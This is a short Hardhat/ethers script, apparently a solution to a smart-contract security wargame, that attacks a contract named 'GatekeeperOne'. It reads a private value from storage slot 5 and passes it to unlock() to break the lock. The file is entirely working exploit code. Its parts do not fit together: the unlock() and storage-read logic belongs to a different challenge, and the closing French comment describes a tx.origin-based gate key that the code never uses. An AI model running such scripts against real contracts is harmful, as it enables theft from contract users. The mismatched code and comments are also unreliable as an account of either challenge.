import { ethers } from "hardhat";

const CONTRACT_NAME = "GatekeeperOne";
const CONTRACT_ADDRESS = "0xCa876B0Af7E5C608dC40027541d1E526a6f4E14f";

async function hack() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  //hack storage
  const storageValue = await ethers.provider?.getStorageAt(CONTRACT_ADDRESS, 5);
  const castToBytes16 = storageValue.slice(0, 16 * 2 + 2);
  console.log(castToBytes16);

  const txAttack = await contract.unlock(castToBytes16);
  await txAttack.wait();

  if (!(await contract.locked())) console.log("🚀 Contract hacked");
  else console.log("❌ Contract not hacked");
}

hack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

//set une chaine hexadecimal de longueur 16+2 (0x) dont les 4 premiers sont non null
// exemple 0xa2B3000000000000 que l'on détermine en gardant les 4+2 premiers caractères de tx.origine
